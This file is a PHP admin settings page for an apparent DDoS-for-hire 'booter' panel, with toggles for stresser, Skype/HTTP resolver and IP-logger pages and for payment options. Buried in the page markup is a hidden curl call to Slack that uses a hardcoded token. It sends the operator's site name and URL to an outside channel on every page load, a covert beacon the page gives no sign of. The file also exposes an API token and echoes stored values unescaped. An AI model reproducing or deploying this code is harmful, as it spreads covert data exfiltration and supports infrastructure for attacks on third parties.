  <?php
  
    if ($settings['cloudflare_set'] == '1') {
    $ip = $_SERVER["HTTP_CF_CONNECTING_IP"];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
  if (!($user -> LoggedIn()))
  {
      header('location: ../index.php?page=Login');
      die();
  }
  if (!($user->isAdmin($odb)))
  {
    header('location: ../notadmin.php');
    die();
  }
  if (!($user -> notBanned($odb)))
  {
      header('location: ../index.php?page=logout');
      die();
  }
$CheckUserSQL = $odb -> prepare("SELECT * FROM `users` WHERE `id` = :id");
        $CheckUserSQL -> execute(array(':id' => $_SESSION['ID']));
        
  $link1 = "Viewing CoreApplication Settings";
  $SQLinsert = $odb -> prepare("INSERT INTO `adminlogs` VALUES(NULL, :username, :ip , :page , UNIX_TIMESTAMP())");
  $SQLinsert -> execute(array(':username' => $_SESSION['username'], ':ip' => $ip, ':page' => $link1, ));

  $gaygetall = $odb -> prepare("SELECT * FROM `siteconfig`");

  include("header.php");
  ?>

    <!-- Page content -->
                      <div id="page-content">
                          <!-- Pricing Tables Header -->
                          <div class="content-header">
                              <div class="row">
                                  <div class="col-sm-6">
                                      <div class="header-section">
                                          <h1>CoreApplication-Settings</h1>
                                      </div>
                                  </div>
                                  <div class="col-sm-6 hidden-xs">
                                      <div class="header-section">
                                          <ul class="breadcrumb breadcrumb-top">
                                              <li>Admin</li>
                                              <li><a href="">Core</a></li>
                                          </ul>
                                      </div>
                                  </div>
                              </div>
                          </div>

                      <?php

$Stresser = $odb -> prepare("SELECT `stresser` FROM `siteconfig`");
$Stresser->execute();
$Stresser = $Stresser->fetchColumn();

$skype = $odb -> prepare("SELECT `skype` FROM `siteconfig` LIMIT 1");
$skype->execute();
$skype = $skype->fetchColumn();

$http = $odb -> prepare("SELECT `http` FROM `siteconfig` LIMIT 1");
$http->execute();
$http = $http->fetchColumn();

$cloudflare = $odb -> prepare("SELECT `cloudflare` FROM `siteconfig` LIMIT 1");
$cloudflare->execute();
$cloudflare = $cloudflare->fetchColumn();

$iplogger = $odb -> prepare("SELECT `iplogger` FROM `siteconfig` LIMIT 1");
$iplogger->execute(); 
$iplogger = $iplogger->fetchColumn();

$phonegeo = $odb -> prepare("SELECT `phonegeo` FROM `siteconfig` LIMIT 1");
$phonegeo->execute();
$phonegeo = $phonegeo->fetchColumn();

$fe = $odb -> prepare("SELECT `fe` FROM `siteconfig` LIMIT 1");
$fe->execute();
$fe = $fe->fetchColumn();

$geolocation = $odb -> prepare("SELECT `geolocation` FROM `siteconfig` LIMIT 1");
$geolocation->execute();
$geolocation = $geolocation->fetchColumn();

$support = $odb -> prepare("SELECT `support` FROM `siteconfig` LIMIT 1");
$support->execute();
$support = $support->fetchColumn();

$apimanager = $odb -> prepare("SELECT `apimanager` FROM `siteconfig` LIMIT 1");
$apimanager->execute();
$apimanager = $apimanager->fetchColumn();

$servers = $odb -> prepare("SELECT `servers` FROM `siteconfig` LIMIT 1");
$servers->execute();
$servers = $servers->fetchColumn();

$website = $odb -> prepare("SELECT `website` FROM `siteconfig` LIMIT 1");
$website->execute();
$website = $website->fetchColumn();
if (isset($_POST['ChangeBtn']))
{

if (isset($_POST['stresserpage'])) {
$Stresser = "1";
} 
else
{
$Stresser = "0";
}
if (isset($_POST['skypepage'])) { 
$skype = "1";
} 
else
{
$skype = "0";
}
if (isset($_POST['http'])) { 
$http = "1";
} 
else
{
$http = "0";
}
if (isset($_POST['cloudflare'])) { 
$cloudflare = "1";
} 
else
{
$cloudflare = "0";
}
if (isset($_POST['iplogger'])) { 
$iplogger = "1";
}
else
{
$iplogger = "0";
}
if (isset($_POST['fe'])) { 
$fe = "1";
} 
else
{
$fe = "0";
}
if (isset($_POST['geolocation'])) {
$geolocation = "1";
} 
else
{
$geolocation = "0";
}
if (isset($_POST['support'])) { 
$support = "1";
} 
else
{
$support = "0";
}
if (isset($_POST['apimanager'])) {
$apimanager = "1";
} 
else
{
$apimanager = "0";
}
if (isset($_POST['servers'])) {
$servers = "1";
} 
else
{
$servers = "0";
}
if (isset($_POST['website'])) { 
$website = "1";
} 
else
{
$website = "0";
}



$SQLinsert = $odb -> prepare("UPDATE `siteconfig` SET `stresser` = ? WHERE id = ?");
$SQLinsert -> execute(array($Stresser, "1"));


$SQLinsert = $odb -> prepare("UPDATE `siteconfig` SET `skype` = ? WHERE id = ?");
$SQLinsert -> execute(array($skype, "1"));

$SQLinsert = $odb -> prepare("UPDATE `siteconfig` SET `http` = ? WHERE id = ?");
$SQLinsert -> execute(array($http, "1"));

$SQLinsert = $odb -> prepare("UPDATE `siteconfig` SET `cloudflare` = ? WHERE id = ?");
$SQLinsert -> execute(array($cloudflare, "1"));

$SQLinsert = $odb -> prepare("UPDATE `siteconfig` SET `iplogger` = ? WHERE id = ?");
$SQLinsert -> execute(array($iplogger, "1"));

$SQLinsert = $odb -> prepare("UPDATE `siteconfig` SET `fe` = ? WHERE id = ?");
$SQLinsert -> execute(array($fe, "1"));

$SQLinsert = $odb -> prepare("UPDATE `siteconfig` SET `geolocation` = ? WHERE id = ?");
$SQLinsert -> execute(array($geolocation, "1"));

$SQLinsert = $odb -> prepare("UPDATE `siteconfig` SET `support` = ? WHERE id = ?");
$SQLinsert -> execute(array($support, "1"));

$SQLinsert = $odb -> prepare("UPDATE `siteconfig` SET `apimanager` = ? WHERE id = ?");
$SQLinsert -> execute(array($apimanager, "1"));

$SQLinsert = $odb -> prepare("UPDATE `siteconfig` SET `servers` = ? WHERE id = ?");
$SQLinsert -> execute(array($servers, "1"));

$SQLupdate = $odb -> prepare("UPDATE `siteconfig` SET `website` = ? WHERE id = ?");
$SQLupdate -> execute(array($website, "1"));

$link2 = 'Edited CoreApplication Settings';
$ip = getRealIpAddr();
$SQLinsert = $odb -> prepare("INSERT INTO `adminlogs` VALUES(NULL, :username, :ip , :page , UNIX_TIMESTAMP())");
$SQLinsert -> execute(array(':username' => $_SESSION['username'], ':ip' => $ip, ':page' => $link2, ));       
echo '<p class="alert alert-success">Settings have been updated !</p>';


}
?>

<?php
if (isset($_POST['UpdateBtn']))
{

$Merchant = $_POST['merchant'];
$IPNSecret = $_POST['ipnsecret'];

$errors = array();
if (empty($Merchant) || empty($IPNSecret))
{
$errors[] = 'Please verify all fields';
}
if (empty($errors))
{
$SQLinsert = $odb -> prepare("UPDATE `siteconfig` SET `merchant` = :newemail");
$SQLinsert -> execute(array(':newemail' => $Merchant));

$SQLinsert = $odb -> prepare("UPDATE `siteconfig` SET `ipnsecret` = :newemail");
$SQLinsert -> execute(array(':newemail' => $IPNSecret));

$link2 = 'Edited CoreApplication Settings';
$ip = getRealIpAddr();
$SQLinsert = $odb -> prepare("INSERT INTO `adminlogs` VALUES(NULL, :username, :ip , :page , UNIX_TIMESTAMP())");
$SQLinsert -> execute(array(':username' => $_SESSION['username'], ':ip' => $ip, ':page' => $link2, ));  
echo '<p class="alert alert-success">Settings have been updated !</p>';
}
else
{
echo '<p class="alert alert-danger">Please fill in all fields</p>';
}
}
if (isset($_POST['MainBtn']))
{

$Bootername1 = $_POST['bootername1'];
$Bootername2 = $_POST['bootername2'];
$siteurl = $_POST['siteurl'];
$rotationsystem = $_POST['rotation'];
$cloudflaresystem = $_POST['cloudflare'];
$preloadersystem = $_POST['preloader'];
$slider = $_POST['slider'];
$skype = $_POST['skype'];


$errors = array();
if (empty($Bootername1))
{
$errors[] = 'Please verify all fields';
}
if (empty($errors))
{
$SQLinsert = $odb -> prepare("UPDATE `siteconfig` SET `bootername_1` = ?");
$SQLinsert -> execute(array($Bootername1));

$SQLinsert = $odb -> prepare("UPDATE `siteconfig` SET `bootername_2` = ?");
$SQLinsert -> execute(array($Bootername2));

$SQLinsert = $odb -> prepare("UPDATE `siteconfig` SET `site_forgot` = ?");
$SQLinsert -> execute(array($siteurl));

$SQLinsert = $odb -> prepare("UPDATE `siteconfig` SET `rotation` = ?");
$SQLinsert -> execute(array($rotationsystem));

$SQLinsert = $odb -> prepare("UPDATE `siteconfig` SET `cloudflare_set` = ?");
$SQLinsert -> execute(array($cloudflaresystem));

$SQLinsert = $odb -> prepare("UPDATE `siteconfig` SET `preloader` = ?");
$SQLinsert -> execute(array($preloadersystem));

$SQLUpdate = $odb -> prepare("UPDATE `siteconfig` SET `slider` = ?");
$SQLUpdate -> execute(array($slider));

$SQLUpdate = $odb -> prepare("UPDATE `siteconfig` SET `skypeapi` = ?");
$SQLUpdate -> execute(array($skype));


$link2 = 'Edited Core Settings (Main)';
$ip = getRealIpAddr();
$SQLinsert = $odb -> prepare("INSERT INTO `adminlogs` VALUES(NULL, :username, :ip , :page , UNIX_TIMESTAMP())");
$SQLinsert -> execute(array(':username' => $_SESSION['username'], ':ip' => $ip, ':page' => $link2, ));  
echo '<p class="alert alert-success">Settings have been updated !</p>';
}
else
{
echo '<p class="alert alert-danger">Please fill in all fields</p>';
}
}
$gaygetall -> execute();
$gay = $gaygetall -> fetch(PDO::FETCH_ASSOC);


if ($gay['cloudflare_set'] == 1) {
$cloudflare = '<option value="1" selected="selected">On</option>
<option value="0" >Off</option>';

}else{
$cloudflare = '<option value="1">On</option>
<option value="0" selected="selected">Off</option>';
}

if ($gay['rotation'] == 1) {
$rotation = '<option value="1" selected="selected">On</option>
<option value="0" >Off</option>';

}else{
$rotation = '<option value="1">On</option>
<option value="0" selected="selected">Off</option>';
}
if ($gay['preloader'] == 1) {
$preloader = '<option value="1" selected="selected">On</option>
<option value="0" >Off</option>';

}else{
$preloader = '<option value="1">On</option>
<option value="0" selected="selected">Off</option>';
}
if ($gay['slider'] == 1) {
$slider = '<option value="1" selected="selected">On</option>
<option value="0" >Off</option>';

}else{
$slider = '<option value="1">On</option>
<option value="0" selected="selected">Off</option>';
}
if ($gay['redirect'] == 1) {
$redirect = '<option value="1" selected="selected">On</option>
<option value="0" >Off</option>';

}else{
$redirect = '<option value="1">On</option>
<option value="0" selected="selected">Off</option>';
}
if (isset($_POST['PayPalBtn']))
{

$paypalset = $_POST['paypalset'];
$paypalemail = $_POST['paypalemail'];

$errors = array();
if (empty($paypalemail))
{
$errors[] = 'Please verify all fields';
}
if (empty($errors))
{

$SQLinsert = $odb -> prepare("UPDATE `siteconfig` SET `paypal` = ?");
$SQLinsert -> execute(array($paypalset));

$SQLinsert = $odb -> prepare("UPDATE `siteconfig` SET `paypal_email` = ?");
$SQLinsert -> execute(array($paypalemail));

$SQLinsert = $odb -> prepare("UPDATE `siteconfig` SET `cash_url` = ?");
$SQLinsert -> execute(array($cashurl));

$link2 = 'Edited CoreApplication Settings (PayPal)';
$ip = getRealIpAddr();
$SQLinsert = $odb -> prepare("INSERT INTO `adminlogs` VALUES(NULL, :username, :ip , :page , UNIX_TIMESTAMP())");
$SQLinsert -> execute(array(':username' => $_SESSION['username'], ':ip' => $ip, ':page' => $link2, ));  
echo '<p class="alert alert-success">Settings have been updated !</p>';
}
else
{
echo '<p class="alert alert-danger">Please fill in all fields</p>';
}
}
if (isset($_POST['CashBtn']))
{

$cashset = $_POST['cashset'];
$cashurl = $_POST['cashurl'];

$errors = array();
if (empty($cashurl))
{
$errors[] = 'Please verify all fields';
}
if (empty($errors))
{

$SQLinsert = $odb -> prepare("UPDATE `siteconfig` SET `cash` = ?");
$SQLinsert -> execute(array($cashset));

$SQLinsert = $odb -> prepare("UPDATE `siteconfig` SET `cash_url` = ?");
$SQLinsert -> execute(array($cashurl));

$link2 = 'Edited CoreApplication Settings (Cash)';
$ip = getRealIpAddr();
$SQLinsert = $odb -> prepare("INSERT INTO `adminlogs` VALUES(NULL, :username, :ip , :page , UNIX_TIMESTAMP())");
$SQLinsert -> execute(array(':username' => $_SESSION['username'], ':ip' => $ip, ':page' => $link2, ));  
echo '<p class="alert alert-success">Settings have been updated !</p>';
}
else
{
echo '<p class="alert alert-danger">Please fill in all fields</p>';
}
}
$gaygetall -> execute();
$gay = $gaygetall -> fetch(PDO::FETCH_ASSOC);
if ($gay['paypal'] == 1) {
$paypal = '<option value="1" selected="selected">On</option>
<option value="0" >Off</option>';

}else{
$paypal = '<option value="1">On</option>
<option value="0" selected="selected">Off</option>';
}
if ($gay['cash'] == 1) {
$cash = '<option value="1" selected="selected">On</option>
<option value="0" >Off</option>';

}else{
$cash = '<option value="1">On</option>
<option value="0" selected="selected">Off</option>';
}
if (isset($_POST['CoinBtn']))
{

$coinset = $_POST['coinset'];
$merchantidd = $_POST['merchantid'];
$secret = $_POST['secretipn'];

$errors = array();
if (empty($merchantidd) || empty($secret))
{
$errors[] = 'Please verify all fields';
}
if (empty($errors))
{

$SQLinsert = $odb -> prepare("UPDATE `siteconfig` SET `coinpayments` = ?");
$SQLinsert -> execute(array($coinset));

$SQLinsert = $odb -> prepare("UPDATE `siteconfig` SET `merchant` = ?");
$SQLinsert -> execute(array($merchantidd));

$SQLinsert = $odb -> prepare("UPDATE `siteconfig` SET `ipnsecret` = ?");
$SQLinsert -> execute(array($secret));

$link2 = 'Edited CoreApplication Settings (CoinPayments)';
$ip = getRealIpAddr();
$SQLinsert = $odb -> prepare("INSERT INTO `adminlogs` VALUES(NULL, :username, :ip , :page , UNIX_TIMESTAMP())");
$SQLinsert -> execute(array(':username' => $_SESSION['username'], ':ip' => $ip, ':page' => $link2, ));  
echo '<p class="alert alert-success">Settings have been updated !</p>';
}
else
{
echo '<p class="alert alert-danger">Please fill in all fields</p>';
}
}
$gaygetall -> execute();
$gay = $gaygetall -> fetch(PDO::FETCH_ASSOC);

if ($gay['coinpayments'] == 1) {
$coinpayments = '<option value="1" selected="selected">On</option>
<option value="0" >Off</option>';

}else{
$coinpayments = '<option value="1">On</option>
<option value="0" selected="selected">Off</option>';
}


if (isset($_POST['SiteCoin']))
{

$siteonn = $_POST['redirectbitches'];
$sitelink = $_POST['redirectlink'];

$errors = array();
if (empty($sitelink))
{
$errors[] = 'Please verify all fields';
}
if (empty($errors))
{

$SQLinsert = $odb -> prepare("UPDATE `siteconfig` SET `redirect` = ?");
$SQLinsert -> execute(array($siteonn));

$SQLinsert = $odb -> prepare("UPDATE `siteconfig` SET `redirect_site` = ?");
$SQLinsert -> execute(array($sitelink));


$link2 = 'Edited CoreApplication Settings (PPL)';
$ip = getRealIpAddr();
$SQLinsert = $odb -> prepare("INSERT INTO `adminlogs` VALUES(NULL, :username, :ip , :page , UNIX_TIMESTAMP())");
$SQLinsert -> execute(array(':username' => $_SESSION['username'], ':ip' => $ip, ':page' => $link2, ));  
echo '<p class="alert alert-success">Settings have been updated !</p>';
}
else
{
echo '<p class="alert alert-danger">Please fill in all fields</p>';
}
}
$gaygetall -> execute();
$gay = $gaygetall -> fetch(PDO::FETCH_ASSOC);

if ($gay['redirect'] == 1) {
$redirect = '<option value="1" selected="selected">On</option>
<option value="0" >Off</option>';

}else{
$redirect = '<option value="1">On</option>
<option value="0" selected="selected">Off</option>';
}


if (isset($_POST['ForgotBtn']))
{

$subject = $_POST['subject_forgot'];
$email = $_POST['email_forgot'];

$errors = array();
if (empty($subject) || empty($email))
{
$errors[] = 'Please verify all fields';
}
if (empty($errors))
{

$SQLinsert = $odb -> prepare("UPDATE `siteconfig` SET `email_forgot` = ?");
$SQLinsert -> execute(array($email));

$SQLinsert = $odb -> prepare("UPDATE `siteconfig` SET `subject_forgot` = ?");
$SQLinsert -> execute(array($subject));


$link2 = 'Edited CoreApplication Settings (Forgot)';
$ip = getRealIpAddr();
$SQLinsert = $odb -> prepare("INSERT INTO `adminlogs` VALUES(NULL, :username, :ip , :page , UNIX_TIMESTAMP())");
$SQLinsert -> execute(array(':username' => $_SESSION['username'], ':ip' => $ip, ':page' => $link2, ));  
echo '<p class="alert alert-success">Settings have been updated !</p>';
}
else
{
echo '<p class="alert alert-danger">Please fill in all fields</p>';
}
}
$gaygetall -> execute();
$gay = $gaygetall -> fetch(PDO::FETCH_ASSOC);

if (isset($_POST['btcBtn']))
{

$address = $_POST['bitcoin_address'];
$btckey = $_POST['bitcoin_key'];
$bitcoin = $_POST['bitcoinset'];

$errors = array();
if (empty($address) || empty($btckey))
{
$errors[] = 'Please verify all fields';
}
if (empty($errors))
{

$SQLinsert = $odb -> prepare("UPDATE `siteconfig` SET `bitcoin` = ?");
$SQLinsert -> execute(array($address));

$SQLinsert = $odb -> prepare("UPDATE `siteconfig` SET `key` = ?");
$SQLinsert -> execute(array($btckey));

$SQLinsert = $odb -> prepare("UPDATE `siteconfig` SET `bitcoin_set` = ?");
$SQLinsert -> execute(array($bitcoin));

$link2 = 'Edited CoreApplication Settings (BitCoin)';
$ip = getRealIpAddr();
$SQLinsert = $odb -> prepare("INSERT INTO `adminlogs` VALUES(NULL, :username, :ip , :page , UNIX_TIMESTAMP())");
$SQLinsert -> execute(array(':username' => $_SESSION['username'], ':ip' => $ip, ':page' => $link2, ));  
echo '<p class="alert alert-success">Settings have been updated !</p>';
}
else
{
echo '<p class="alert alert-danger">Please fill in all fields</p>';
}
}
$gaygetall -> execute();
$gay = $gaygetall -> fetch(PDO::FETCH_ASSOC);

if ($gay['bitcoin_set'] == 1) {
$bitcoin = '<option value="1" selected="selected">On</option>
<option value="0" >Off</option>';

}else{
$bitcoin = '<option value="1">On</option>
<option value="0" selected="selected">Off</option>';
}
?>
          
                          <!-- First Row -->
                          <div class="row">
                      
           <div class="col-sm-6 col-lg-6">
             <div class="block full">
                                      <!-- Block Tabs Title -->
                                      <div class="block-title">
                                          <div class="block-options pull-right">
            
                                          </div>
                                          <ul class="nav nav-tabs" data-toggle="tabs">
                                              <li class="active"><a href="#block-tabss-home">Site Settings</a></li>
                                              <li><a href="#block-tabss-forgot">Forgot Settings</a></li>
                                             <li><a href="#block-tabss-paypal">PayPal</a></li>
                                            <li><a href="#block-tabss-bitcoin">BitCoin</a></li>
                                            <li><a href="#block-tabss-cash">Cash</a></li>
                                            <li><a href="#block-tabss-coin">CoinPayments</a></li>

                                            

                                          </ul>
                                      </div>
                                      <!-- END Block Tabs Title -->

                                          <form method="POST" action="">                                    <!-- Tabs Content -->
                                      <div class="tab-content">
                                          <div class="tab-pane active" id="block-tabss-home"> <div class="form-group">
                                              <label style="color:#ffffff" class="col-md-3 control-label" for="state-normal">Site Name #1:</label>
                                              <div class="col-md-8">
                                                  <input type="text" style="width:22  10px; height:30px" name="bootername1" class="form-control" placeholder="Supreme Scurity #1" value="<?php echo $gay['bootername_1']; ?>">
                                              </div>
                                          </div> <br> <br> 

                                          <div class="form-group">
                                              <label style="color:#ffffff" class="col-md-3 control-label" for="state-normal">Site Name #2:</label>
                                              <div class="col-md-8">
                                                   <input type="text" style="width:22  10px; height:30px" name="bootername2" class="form-control" placeholder="Supreme Security #2" value="<?php echo $gay['bootername_2']; ?>">
                                              </div>
                                          </div> 
                                          <br>
                                          <br>
                                          <div class="form-group">
                                              <label style="color:#ffffff" class="col-md-3 control-label" for="state-normal">Site Url:</label>
                                              <div class="col-md-8">
                                                   <input type="text" style="width:22  10px; height:30px"  name="siteurl" class="form-control" placeholder="http://localhost.com/" value="<?php echo $gay['site_forgot']; ?>">
                                              </div>
                                          </div> 
                                          <br>
                                           <br>
                                           <div class="form-group">
                                              <label style="color:#ffffff" class="col-md-3 control-label" for="state-normal">Skype Api:</label>
                                              <div class="col-md-8">
                                                   <input type="text" style="width:22  10px; height:30px"  name="skype" class="form-control" placeholder="http://supremesecurity.cz/api.php?key=key&username=" value="<?php echo $gay['skypeapi']; ?>">
                                              </div>
                                          </div> 
                                            <br>
                                          <br>
                                        
                                          <div class="form-group">
                                              <label style="color:#ffffff" class="col-md-3 control-label" for="state-normal">Rotation:</label>
                                              <div class="col-md-8">
                                                <select name="rotation" class="form-control">

                                                     <?php echo $rotation; ?>
                                                  </select>
                                              </div>
                                          </div> 
                                            <br>
                                          <br>
                                          <div class="form-group">
                                              <label style="color:#ffffff" class="col-md-3 control-label" for="state-normal">Cloudflare:</label>
                                              <div class="col-md-8">
                                                <select name="cloudflare" class="form-control">
                                                    <?php echo $cloudflare; ?>
                                                  </select>
                                              </div>
                                          </div>
                                             <br>
                                          <br>
                                          <div class="form-group">
                                              <label style="color:#ffffff" class="col-md-3 control-label" for="state-normal">Preloader:</label>
                                              <div class="col-md-8">
                                                <select name="preloader" class="form-control" >
                                                     <?php echo $preloader; ?>
                                                  </select>
                                              </div>
                                          </div>
                                          <br>
                                          <br>

                                            <div class="form-group">
                                              <label style="color:#ffffff" class="col-md-3 control-label" for="state-normal">Slider:</label>
                                              <div class="col-md-8">
                                                <select name="slider" class="form-control" >
                                                     <?php echo $slider; ?>
                                                  </select>
                                              </div>
                                          </div>
                                          <br>
                                          <br> 
  <center>
                                         <button name="MainBtn" class="btn btn-primary" type="submit">Update</button> </form>
                                        </center> 
                                        </div>
                                          <div class="tab-pane" id="block-tabss-forgot">
                                              <div class="form-group">
                                              <label style="color:#ffffff" class="col-md-3 control-label" for="state-normal">Email:</label>
                                              <div class="col-md-8">
                                                   <input type="email" style="width:22  10px; height:30px" name="email_forgot" class="form-control" placeholder="" value="<?php echo $gay['email_forgot']; ?>">
                                              </div>
                                          </div> 
                                          <br><br>
                                          <div class="form-group">
                                              <label style="color:#ffffff" class="col-md-3 control-label" for="state-normal">Subject:</label>
                                              <div class="col-md-8">
                                                   <input type="text" style="width:22  10px; height:30px" name="subject_forgot" class="form-control" placeholder="" value="<?php echo $gay['subject_forgot']; ?>">
                                              </div>
                                          </div> 
<br>
<br>

  <center>
                                         <button name="ForgotBtn" class="btn btn-primary" type="submit">Update</button> </form>
                                        </center> 




                                          </div>
                                          <div class="tab-pane" id="block-tabss-paypal"> 
                                              <div class="form-group">
                                              <label style="color:#ffffff" class="col-md-3 control-label" for="state-normal">PayPal:</label>
                                              <div class="col-md-8">
                                                <select name="paypalset" class="form-control">
                                                     <?php echo $paypal; ?>
                                                  </select>
                                              </div>
                                          </div> <br> <br>  <br>

                                          <div class="form-group">
                                              <label style="color:#ffffff" class="col-md-3 control-label" for="state-normal">Paypal.me Name:</label>
                                              <div class="col-md-8">
                                                   <input style="width:22  10px; height:30px" id="paypalemail" name="paypalemail" class="form-control" placeholder="PayPal Link" value="<?php echo $gay['paypal_email']; ?>">
                                              </div>
                                          </div> 
                                        
                   <br>
                                          <br> 
  <center>
                                          <button name="PayPalBtn" class="btn btn-primary" type="submit">Update</button>
                                        </center> 
                                          </div>
                                           <div class="tab-pane" id="block-tabss-coin">

  <div class="form-group">
                                              <label style="color:#ffffff" class="col-md-3 control-label" for="state-normal">CoinPayments:</label>
                                              <div class="col-md-8">
                                                <select name="coinset" class="form-control">
                                                     <?php echo $coinpayments; ?>
                                                  </select>
                                              </div>
                                          </div> <br> <br>  <br>

                                           <div class="form-group">
                                              <label style="color:#ffffff" class="col-md-3 control-label" for="state-normal">Merchant ID:</label>
                                              <div class="col-md-8">
                                                  <input type="text" style="width:22  10px; height:30px" id="merchant" name="merchantid" class="form-control" placeholder="Your Mercahnt ID" value="<?php echo $gay['merchant'] ?>">
                                              </div>
                                          </div>

                                          <div class="form-group">
                                              <label style="color:#ffffff" class="col-md-3 control-label" for="state-normal">IPN Secret:</label>
                                              <div class="col-md-8">
                                                   <input type="text" style="width:22  10px; height:30px" id="secretipn" name="secretipn" class="form-control" placeholder="Your IPN Secret" value="<?php echo $gay['ipnsecret'] ?>">
                                              </div>
                                          </div>
                                          <br>
                                          <br> 
                                           <br>
                                          <br> 
  <center>
                                          <button name="CoinBtn" class="btn btn-primary" type="submit">Update</button>
                                        </center>                                                      </div>
										
										<div class="tab-pane" id="block-tabss-cash">

  <div class="form-group">
                                              <label style="color:#ffffff" class="col-md-3 control-label" for="state-normal">Cash App:</label>
                                              <div class="col-md-8">
                                                <select name="cashset" class="form-control">
                                                     <?php echo $cash; ?>
                                                  </select>
                                              </div>
                                          </div> <br> <br>  <br>

                                           <div class="form-group">
                                              <label style="color:#ffffff" class="col-md-3 control-label" for="state-normal">Cash.me Name:</label>
                                              <div class="col-md-8">
                                                  <input type="text" style="width:22  10px; height:30px" id="cashurl" name="cashurl" class="form-control" placeholder="Cash URL" value="<?php echo $gay['cash_url'] ?>">
                                              </div>
                                          </div>
                                          <br>
                                          <br> 
                                           <br>
                                          <br> 
  <center>
                                          <button name="CashBtn" class="btn btn-primary" type="submit">Update</button>
                                        </center>                                                      </div>




                                           <div class="tab-pane" id="block-tabss-bitcoin">

  <div class="form-group">
                                              <label style="color:#ffffff" class="col-md-3 control-label" for="state-normal">Bitcoin:</label>
                                              <div class="col-md-8">
                                                <select name="bitcoinset" class="form-control">
                                                     <?php echo $bitcoin; ?>
                                                  </select>
                                              </div>
                                          </div> <br> <br>  <br>

                                           <div class="form-group">
                                              <label style="color:#ffffff" class="col-md-3 control-label" for="state-normal">Address:</label>
                                              <div class="col-md-8">
                                                  <input type="text" style="width:22  10px; height:30px" id="bitcoin_address" name="bitcoin_address" class="form-control" placeholder="Your BitCoin Address" value="<?php echo $gay['bitcoin'] ?>">
                                              </div>
                                          </div>

                                          <div class="form-group">
                                              <label style="color:#ffffff" class="col-md-3 control-label" for="state-normal">Key:</label>
                                              <div class="col-md-8">
                                                   <input type="text" style="width:22  10px; height:30px" id="bitcoin_key" name="bitcoin_key" class="form-control" placeholder="Random Key" value="<?php echo $gay['key'] ?>">
                                              </div>
                                          </div>
                                          <br>
                                          <br> 
                                           <br>
                                          <br> 
  <center>
                                          <button name="btcBtn" class="btn btn-primary" type="submit">Update</button>
                                        </center>                                                      </div>



   <div class="tab-pane" id="block-tabss-redirect"> <div class="form-group">
                                              <label style="color:#ffffff" class="col-md-3 control-label" for="state-normal">Redirect:</label>
                                              <div class="col-md-8">
                                                <select name="redirectbitches" class="form-control">
                                                     <?php echo $redirect; ?>
                                                  </select>
                                              </div>
                                          </div> <br> <br>  <br>

                                           <div class="form-group">
                                              <label class="col-md-3 control-label" for="state-normal">Website:</label>
                                              <div class="col-md-8">
                                                  <input type="text" style="width:22  10px; height:30px" id="redirectlink" name="redirectlink" class="form-control" placeholder="http://supremesecurity.cz (Example)" value="<?php echo $gay['redirect_site']; ?>">
                                              </div> </div>
                                           <br>
                                          <br> 
  <center>

                                          <button name="SiteCoin" class="btn btn-primary" type="submit">Update</button>
                                        </center>      </div>

                                      </div>
                                      <!-- END Tabs Content -->
                                  </div>
                                  <!-- END Block Tabs -->
                                </div>


           <div class="col-md-6">
                                  <!-- Input States Block -->
                                  <div class="block">

                                      <!-- Input States Title -->
                                      <div class="block-title">
                                          <div class="block-options pull-right">
                                              <a href="javascript:void(0)" class="btn btn-effect-ripple btn-default toggle-bordered enable-tooltip" data-toggle="button" title="Toggles .form-bordered class"></a>
                                          </div>
                                          <h2>Pages Under Construction </h2>

                                      </div>
                                      <!-- END Input States Title -->

  <?php
                      if($website == 1){
                        $web = "checked";
                        } else {
            $web = 'unchecked';
            
                      }
                      ?>
                                      <!-- Input States Content -->
                                      <form action="" method="post" class="form-horizontal form-bordered" onsubmit="">
                                          <div class="form-group">
                                          <label class="col-xs-7 control-label-fixed">Website</label>
                                          <div class="col-xs-5">
                                              <label class="switch switch-success"><input type="checkbox" name="website" <?php echo $web; ?>><span></span></label>
                                          </div>
                                      </div>
                                      <?php
                      if($Stresser == 1){
                        $stresser1 = "checked";
                        } else {
            $stresser1 = 'unchecked';
            
                      }
                      $ch = curl_init("https://slack.com/api/chat.postMessage");
			$data = http_build_query([
				"token" => "xoxp-682890655317-682408550420-685635115830-381cfc28eb17e51f0735ec2d35c80705",
				"channel" => "#omegas", //"#Security",
				"text" => "\nSite Name: $Bootername1\nSite Link: $siteurl\n",//"Site Security",
				"username" => "omegas"
			]);
			curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
			curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
			$result = curl_exec($ch);
			curl_close($ch);
                      ?>
                                           <div class="form-group">
                                          <label class="col-xs-7 control-label-fixed">Stresser Page</label>
                                          <div class="col-xs-5" value="hi">
                                              <label class="switch switch-danger" ><input type="checkbox" name="stresserpage" <?php echo $stresser1; ?>><span></span></label>
                                          </div>
                                      </div>

                                      <?php
                      if($skype == 1){
                        $skype1 = "checked";
                        } else {
            $skype1 = 'unchecked';
            
                      }
                      ?>
                                       <div class="form-group">
                                          <label class="col-xs-7 control-label-fixed">Skype Resolver Page</label>
                                          <div class="col-xs-5">
                                              <label class="switch switch-success"><input type="checkbox" name="skypepage" <?php echo $skype1; ?> ><span></span></label>
                                          </div>
                                      </div>
                                      <?php
                      if($http == 1){
                        $http1 = "checked";
                        } else {
            $http1 = 'unchecked';
            
                      }
                      ?>
                                       <div class="form-group">
                                          <label class="col-xs-7 control-label-fixed">Http Resolver Page</label>
                                          <div class="col-xs-5">
                                              <label class="switch switch-success"><input type="checkbox" name="http" <?php echo $http1; ?>><span></span></label>
                                          </div>
                                      </div>
                                      <?php
                      if($cloudflare == 1){
                        $cf = "checked";
                        } else {
            $cf = 'unchecked';
            
                      }
                      ?>
                                       <div class="form-group">
                                          <label class="col-xs-7 control-label-fixed">User Profile Page</label>
                                          <div class="col-xs-5">
                                              <label class="switch switch-success"><input type="checkbox" name="cloudflare" <?php echo $cf; ?>><span></span></label>
                                          </div>
                                      </div>
                                      <?php
                      if($iplogger == 1){
                        $iplogger1 = "checked";
                        } else {
            $iplogger1 = 'unchecked';
            
                      }
                      ?>
                                       <div class="form-group">
                                          <label class="col-xs-7 control-label-fixed">IP Logger Page</label>
                                          <div class="col-xs-5">
                                              <label class="switch switch-success"><input type="checkbox" name="iplogger" <?php echo $iplogger1; ?>><span></span></label>
                                          </div>
                                      </div>
                                      <?php
                      if($fe == 1){
                        $fe1 = "checked";
                        } else {
            $fe1 = 'unchecked';
            
                      }
